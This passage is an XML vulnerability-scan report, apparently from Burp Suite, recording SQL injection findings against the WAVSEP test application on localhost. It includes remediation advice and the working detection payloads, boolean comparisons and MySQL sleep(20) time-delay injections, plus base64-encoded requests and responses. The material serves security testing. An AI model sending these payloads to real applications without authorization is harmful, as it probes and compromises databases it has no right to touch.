      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2736514067761660928</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>83689097' or '6923'='6923</b> and <b>42011946' or '6441'='6449</b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20018</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQ4MzY4OTA5NyclMjBvciUyMCc2OTIzJyUzZCc2OTIz]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQ0MjAxMTk0NiclMjBvciUyMCc2NDQxJyUzZCc2NDQ5]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5696146501251812352</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDUtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0Kb3JkZXJieT1tc2dpZCUyYyhzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CnRlc3RpbnB1dAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMgo8L1REPgo8VEQ+ClJlbWVtYmVyIHRvIGNoYW5nZSB5b3VyIHBhc3N3b3JkCjwvVEQ+CjxURD4KSW52ZXN0IGluIHlvdXIgc2VjdXJpdHkhCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+ClBsZWFzZSByZW5ldyBpdCBpbiB0aGUgbmV4dCB0d28gd2Vla3MKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1833326978942202880</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
